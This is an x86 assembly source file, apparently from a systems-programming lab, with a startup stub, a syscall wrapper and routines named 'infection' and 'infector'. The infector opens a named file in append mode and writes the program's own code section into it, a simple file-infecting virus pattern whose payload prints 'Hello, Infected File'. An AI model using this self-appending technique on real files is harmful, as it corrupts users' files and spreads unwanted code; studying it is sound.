section .rodata
  infect_msg: db "Hello, Infected File", 10, 0	; define a constant infect message followed by '\n' and '\0'
  infect_msg_len: equ $-infect_msg

section .data
   file_desc: dd 0

section .text
global _start
global system_call
global infection
global infector
extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:

   infection:
      push ebp                ; Save caller state
      mov ebp, esp
      pushad                  ; Save some more caller state

      mov ecx, infect_msg		; point ecx to infect message to write
      mov edx, infect_msg_len ; store infect msg length
      mov ebx, 1		         ; file descriptor (stdout)
      mov eax, 4		         ; system call number (sys_write)
      int 0x80                ; Transfer control to operating system

      popad                   ; Restore caller state (registers)
      mov esp, ebp            ; Restore caller state
      pop ebp                 ; Restore caller state
      ret                     ; Back to caller

   infector:
      push    ebp                   ; Save caller state
      mov     ebp, esp
      pushad                        ; Save some more caller state

      mov ebx, dword [ebp+8]			; get function argument (pointer to input filename string)
      mov ecx, 0x401                ; set ecx to O_APPEND mode
      mov edx, 0x700
      mov eax, 5                    ;open
      int 0x80                ; Transfer control to operating system
      mov [file_desc], eax

      mov ebx, [file_desc]            ; assign ebx with returned open file descriptor
      mov ecx, code_start
      mov edx, code_end
      sub edx, ecx
      mov eax, 4                    ;write
      int 0x80                ; Transfer control to operating system

      mov ebx, [file_desc]
      mov eax, 6                    ; close
      int 0x80                ; Transfer control to operating system

      popad                   ; Restore caller state (registers)
      mov esp, ebp            ; Restore caller state
      pop ebp                 ; Restore caller state
      ret                     ; Back to caller

code_end:
